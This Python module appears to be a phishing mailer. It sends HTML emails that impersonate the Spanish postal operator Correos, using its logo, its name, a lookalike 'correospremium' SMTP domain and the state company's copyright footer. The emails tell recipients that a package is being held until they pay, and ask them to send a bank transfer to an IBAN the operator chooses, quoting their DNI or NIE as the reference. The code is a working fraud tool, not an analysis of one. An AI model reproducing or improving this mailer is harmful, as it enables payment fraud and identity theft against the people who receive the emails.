"""
Email service for sending tracking notification emails using SMTP.
Configured for Hostalia SMTP server.
"""

import os
import logging
import base64
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from datetime import datetime
from typing import Optional, Dict, Any
from pathlib import Path

logger = logging.getLogger(__name__)

SMTP_HOST = os.environ.get('SMTP_HOST', 'smtp.correospremium.com.es')
SMTP_PORT = int(os.environ.get('SMTP_PORT', '587'))
SMTP_USER = os.environ.get('SMTP_USER', '')
SMTP_PASSWORD = os.environ.get('SMTP_PASSWORD', '')
SMTP_FROM_EMAIL = os.environ.get('SMTP_FROM_EMAIL', '')
SMTP_FROM_NAME = os.environ.get('SMTP_FROM_NAME', 'Correos')

def get_logo_base64() -> str:
    """Get the Correos logo as base64 string."""
    possible_paths = [
        Path(__file__).parent.parent / 'static' / 'logo_correos.png',
        Path(__file__).parent.parent / 'attached_assets' / 'logo_1764785999855.png',
        Path(__file__).parent.parent.parent / 'attached_assets' / 'logo_1764785999855.png',
    ]
    for logo_path in possible_paths:
        if logo_path.exists():
            with open(logo_path, 'rb') as f:
                return base64.b64encode(f.read()).decode('utf-8')
    return ""


def get_logo_bytes() -> Optional[bytes]:
    """Get the Correos logo as bytes for SMTP attachment."""
    possible_paths = [
        Path(__file__).parent.parent / 'static' / 'logo_correos.png',
        Path(__file__).parent.parent / 'attached_assets' / 'logo_1764785999855.png',
        Path(__file__).parent.parent.parent / 'attached_assets' / 'logo_1764785999855.png',
    ]
    for logo_path in possible_paths:
        if logo_path.exists():
            with open(logo_path, 'rb') as f:
                return f.read()
    return None


def format_date(date_str: Optional[str] = None) -> str:
    """Formatea una fecha en español."""
    months = {
        'January': 'enero', 'February': 'febrero', 'March': 'marzo',
        'April': 'abril', 'May': 'mayo', 'June': 'junio',
        'July': 'julio', 'August': 'agosto', 'September': 'septiembre',
        'October': 'octubre', 'November': 'noviembre', 'December': 'diciembre'
    }
    
    if not date_str:
        now = datetime.now()
        date_formatted = now.strftime('%d de %B de %Y')
        for en, es in months.items():
            date_formatted = date_formatted.replace(en, es)
        return date_formatted
    
    try:
        if isinstance(date_str, datetime):
            date = date_str
        else:
            date = datetime.fromisoformat(date_str.replace('Z', '+00:00'))
        date_formatted = date.strftime('%d de %B de %Y')
        for en, es in months.items():
            date_formatted = date_formatted.replace(en, es)
        return date_formatted
    except Exception as e:
        print(f"Error formatting date: {e}")
        return date_str


def generate_email_html(data: Dict[str, Any]) -> str:
    """Genera el HTML del correo de comunicado estilo Correos."""
    current_date = format_date()
    arrival_date = data.get('arrivalDate') or 'Por confirmar'
    
    shipping_cost = data.get('shippingCost') or '20,00'
    product_cost = data.get('productCost') or '0,00'
    
    try:
        total = float(str(shipping_cost).replace(',', '.').replace('$', '').strip()) + \
                float(str(product_cost).replace(',', '.').replace('$', '').strip())
        total_amount = data.get('totalAmount') or f"{total:.2f}".replace('.', ',')
    except (ValueError, TypeError) as e:
        print(f"Error calculating total amount: {e}")
        total_amount = data.get('totalAmount') or '20,00'
    
    return f'''<!DOCTYPE html>
<html>
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
</head>
<body style="font-size: 10pt; font-family: Verdana, Geneva, sans-serif; margin: 0; padding: 0;">
  <div style="background-color: #f2f2f2; padding: 30px 0; margin: 0; font-family: Arial, sans-serif;">
    <div style="max-width: 600px; margin: 0 auto; background: #ffffff; border-radius: 8px; overflow: hidden; border: 1px solid #ddd;">
      
      <!-- Logo -->
      <div style="height: 80px; text-align: center; padding-top: 20px; background: #ffffff;">
        <img src="cid:logo-correos" alt="Correos" style="height: 60px;" />
      </div>
      
      <!-- Header Banner -->
      <div style="background: #ffffff; padding: 20px; text-align: center; border-bottom: 2px solid #ddd;">
        <div style="display: inline-block; background: #f0b823; color: #ffffff; padding: 12px 20px; border-radius: 5px; font-weight: bold; font-size: 16px; line-height: 1.4;">
          <span style="font-size: 14pt; font-family: 'Arial Black', sans-serif;">{current_date} | Paquete entregado</span>
        </div>
        <p style="margin-top: 15px; font-size: 14px; color: #555555; line-height: 1.5; text-align: center;">
          <span style="font-size: 12pt;">Le informamos que su paquete ha sido recibido y está siendo cuidadosamente revisado y asegurado. Esta es una solicitud de confirmación de envío premium. Todo el proceso está siendo gestionado para proteger los bienes de ambas partes, tanto del Remitente como del Destinatario. A continuación, le indicamos los pasos a seguir para recibir su paquete sin inconvenientes. Esta solicitud le permitirá verificar el paquete al momento de recibirlo. Actualmente, el paquete está retenido en espera de su confirmación para proceder con el envío</span>
        </p>
      </div>

      <!-- Information Section -->
      <div style="padding: 20px;">
        <h2 style="text-align: center; margin-bottom: 15px;">
          <a style="display: block; background: #f0b823; color: #fff; text-decoration: none; text-align: center; padding: 12px; border-radius: 5px; width: 200px; margin: 15px auto; font-weight: bold; font-family: 'Arial Black', sans-serif;">INFORMACIÓN</a>
        </h2>
        
        <!-- Sender Info -->
        <p style="text-align: center; font-size: 14pt; margin-bottom: 20px;">
          <strong>Remitente:</strong><br />
          👤 Nombre: {data.get('senderName') or 'No disponible'}<br />
          📞 Teléfono: {data.get('senderPhone') or 'No disponible'}<br />
          <strong>Dirección de depósito:</strong><br />
          {data.get('senderAddress') or 'No disponible'}<br />
          {data.get('senderPostalCode') or ''}<br />
          {data.get('senderCity') or ''}
        </p>

        <!-- Recipient Info -->
        <p style="text-align: center; font-size: 14pt; margin-bottom: 20px;">
          <strong>Destinatario:</strong><br />
          👤 Nombre: {data.get('recipientName') or 'No disponible'}<br />
          📞 Teléfono: {data.get('recipientPhone') or 'No disponible'}<br />
          <strong>Dirección de Entrega:</strong><br />
          {data.get('recipientAddress') or 'No disponible'}<br />
          {data.get('recipientPostalCode') or ''}<br />
          {data.get('recipientCity') or ''}
        </p>

        <!-- Package Details -->
        <p style="text-align: center; font-size: 11pt;">
          <strong>Contenido:</strong><br />
          {data.get('content') or 'No especificado'}
        </p>
        <p style="text-align: center; font-size: 11pt;">
          <strong>Peso:</strong><br />
          {data.get('weight') or 'No especificado'}
        </p>
        <p style="text-align: center; font-size: 11pt;">
          <strong>Fecha de Llegada:</strong><br />
          {arrival_date}
        </p>
      </div>

      <!-- Instructions Section -->
      <div style="background: #ffffff; padding: 20px; text-align: center; border-bottom: 2px solid #ddd;">
        <h2 style="text-align: center; margin-bottom: 15px;">
          <a style="display: block; background: #f0b823; color: #fff; text-decoration: none; text-align: center; padding: 12px; border-radius: 5px; width: 200px; margin: 15px auto; font-weight: bold; font-family: 'Arial Black', sans-serif;">INSTRUCCIONES</a>
        </h2>
        <p style="font-size: 14px; color: #555555; line-height: 1.5; text-align: center;">
          <span style="font-size: 12pt; color: #000000;">Para procesar su pedido, realice el pago únicamente a las entidades bancarias autorizadas. Una vez confirmado, recibirá el código de seguimiento correspondiente, conforme al protocolo de <span style="font-family: 'Arial Black', sans-serif;">Envío Premium.</span></span><br /><br />
          <span style="font-size: 12pt; color: #000000;">La entrega se realizará en un plazo estimado de <span style="font-family: 'Arial Black', sans-serif;">24 a 48 horas</span>. El importe será retenido de forma segura por nuestros agentes bancarios hasta que se complete la entrega, protegiendo así los intereses de ambas partes.</span><br /><br />
          <span style="font-size: 12pt; color: #000000;">El destinatario podrá revisar el contenido del paquete al momento de recibirlo. En caso de anomalías o desperfectos, podrá solicitar un reembolso, según los términos previamente acordados.</span>
        </p>
      </div>

      <!-- Payment Section -->
      <div style="background: #f9f9f9; padding: 20px; text-align: center;">
        <h2 style="text-align: center; margin-bottom: 15px;">
          <a style="display: block; background: #f0b823; color: #ffffff; text-decoration: none; text-align: center; padding: 12px; border-radius: 5px; width: 200px; margin: 15px auto; font-weight: bold; font-family: 'Arial Black', sans-serif;">DATOS DE PAGO</a>
        </h2>
        <p style="font-size: 14px; color: #555555; line-height: 1.5; text-align: center;">
          <span style="font-size: 12pt; font-family: 'Arial Black', sans-serif; color: #000000;"><strong>Entidad Bancaria:</strong> {data.get('bankEntity') or 'Correos (N26)'}</span><br />
          <span style="font-size: 12pt; color: #000000;"><strong><span style="font-family: 'Arial Black', sans-serif;">IBAN:</span></strong> <span style="font-family: 'Arial Black', sans-serif;">{data.get('iban') or 'ES00 0000 0000 0000 0000 0000'}</span></span><br /><br />
          <span style="font-size: 12pt; color: #000000;"><span style="font-family: 'Arial Black', sans-serif;"><strong>Beneficiario:</strong></span><br />Colocar Tu Nombre Completo <span style="font-family: 'Arial Black', sans-serif;">(Destinatario)</span></span><br />
          <span style="font-size: 12pt; color: #000000;"><span style="font-family: 'Arial Black', sans-serif;"><strong>Concepto:</strong></span><br />Colocar Número de DNI o NIE</span><br />
          <span style="font-size: 12pt; color: #000000;"><strong><span style="font-family: 'Arial Black', sans-serif;">Costo del envío:</span></strong><br />{shipping_cost}€</span><br />
          <span style="font-size: 12pt; color: #000000;"><span style="font-family: 'Arial Black', sans-serif;"><strong>Costo del producto:</strong></span><br />{product_cost}€</span><br />
          <span style="font-size: 12pt; color: #000000;"><span style="font-family: 'Arial Black', sans-serif;"><strong>Importe total:</strong></span> {total_amount}€</span><br /><br />
          <span style="font-family: 'Arial Black', sans-serif; font-size: 8pt;">NOTA</span><br />
          <span style="font-size: 8pt;">Enviar y guardar comprobante y/o pantallazo de la transferencia realizada</span>
        </p>
      </div>

      <!-- Footer -->
      <div style="background-color: #f0b823; width: 100%; text-align: center; padding: 20px 0; font-family: Arial, sans-serif; font-size: 12px; color: #ffffff;">
        <span style="font-family: Arial, Helvetica, sans-serif; font-size: 11pt;">© Sociedad estatal Correos y Telégrafos, S.A, S.M.E. Todos los derechos reservados.</span>
      </div>
      
    </div>
  </div>
</body>
</html>'''


def prepare_tracking_email_data(tracking) -> Dict[str, Any]:
    """Prepara los datos del tracking para el email."""
    return {
        'senderName': tracking.sender_name if hasattr(tracking, 'sender_name') else None,
        'senderPhone': tracking.sender_phone if hasattr(tracking, 'sender_phone') else None,
        'senderAddress': tracking.sender_address,
        'senderCity': tracking.sender_province or tracking.sender_country,
        'senderPostalCode': tracking.sender_postal_code,
        'recipientName': tracking.recipient_name if hasattr(tracking, 'recipient_name') else None,
        'recipientPhone': tracking.recipient_phone if hasattr(tracking, 'recipient_phone') else None,
        'recipientAddress': tracking.delivery_address,
        'recipientCity': tracking.recipient_province or tracking.recipient_country,
        'recipientPostalCode': tracking.recipient_postal_code,
        'content': tracking.product_name,
        'weight': tracking.package_weight,
        'arrivalDate': tracking.estimated_delivery_date or '',
        'shippingCost': None,
        'productCost': tracking.product_price,
        'totalAmount': tracking.product_price,
        'bankEntity': None,
        'iban': None,
    }


def send_tracking_email(recipient_email: str, tracking_data: Dict[str, Any]) -> Dict[str, Any]:
    """Envía el correo usando SMTP de Hostalia."""
    if not SMTP_USER or not SMTP_PASSWORD:
        logger.error("SMTP credentials not configured")
        return {'success': False, 'error': 'Credenciales SMTP no configuradas'}
    
    logger.info(f"📧 Enviando correo a: {recipient_email}")
    
    try:
        msg = MIMEMultipart('related')
        msg['Subject'] = 'Realizar confirmación de envío ✅'
        msg['From'] = f'{SMTP_FROM_NAME} <{SMTP_FROM_EMAIL}>'
        msg['To'] = recipient_email
        
        html_content = generate_email_html(tracking_data)
        html_part = MIMEText(html_content, 'html', 'utf-8')
        msg.attach(html_part)
        
        logo_bytes = get_logo_bytes()
        if logo_bytes:
            logo_image = MIMEImage(logo_bytes)
            logo_image.add_header('Content-ID', '<logo-correos>')
            logo_image.add_header('Content-Disposition', 'inline', filename='logo-correos.png')
            msg.attach(logo_image)
        
        with smtplib.SMTP(SMTP_HOST, SMTP_PORT) as server:
            server.starttls()
            server.login(SMTP_USER, SMTP_PASSWORD)
            server.send_message(msg)
        
        logger.info(f"✅ Correo enviado exitosamente a {recipient_email}")
        return {'success': True, 'message': f'Correo enviado a {recipient_email}'}
        
    except smtplib.SMTPAuthenticationError as e:
        logger.error(f"❌ Error de autenticación SMTP: {e}")
        return {'success': False, 'error': 'Error de autenticación - verifica usuario y contraseña'}
    except smtplib.SMTPConnectError as e:
        logger.error(f"❌ Error de conexión SMTP: {e}")
        return {'success': False, 'error': 'No se pudo conectar al servidor de correo'}
    except smtplib.SMTPException as e:
        logger.error(f"❌ Error SMTP: {e}")
        return {'success': False, 'error': f'Error SMTP: {str(e)}'}
    except Exception as e:
        logger.error(f"❌ Error: {e}")
        return {'success': False, 'error': str(e)}


class EmailService:
    """Email service class for sending tracking emails."""
    
    @staticmethod
    def is_configured() -> bool:
        """Check if email service is configured."""
        return bool(SMTP_USER and SMTP_PASSWORD)
    
    @staticmethod
    def send_email(recipient_email: str, tracking) -> Dict[str, Any]:
        """Send email for a tracking object."""
        email_data = prepare_tracking_email_data(tracking)
        return send_tracking_email(recipient_email, email_data)
    
    @staticmethod
    def send_email_with_data(recipient_email: str, email_data: Dict[str, Any]) -> Dict[str, Any]:
        """Send email with custom data dict."""
        return send_tracking_email(recipient_email, email_data)
    
    @staticmethod
    def send_email_with_bank_data(recipient_email: str, tracking, bank_entity: str, iban: str) -> Dict[str, Any]:
        """Send email for a tracking object with custom bank details."""
        email_data = prepare_tracking_email_data(tracking)
        email_data['bankEntity'] = bank_entity
        email_data['iban'] = iban
        return send_tracking_email(recipient_email, email_data)
    
    @staticmethod
    def test_connection() -> Dict[str, Any]:
        """Test SMTP connection."""
        if not SMTP_USER or not SMTP_PASSWORD:
            return {'success': False, 'error': 'Credenciales SMTP no configuradas'}
        
        try:
            with smtplib.SMTP(SMTP_HOST, SMTP_PORT) as server:
                server.starttls()
                server.login(SMTP_USER, SMTP_PASSWORD)
            return {'success': True, 'message': 'Conexión SMTP exitosa'}
        except Exception as e:
            return {'success': False, 'error': str(e)}


email_service = EmailService()
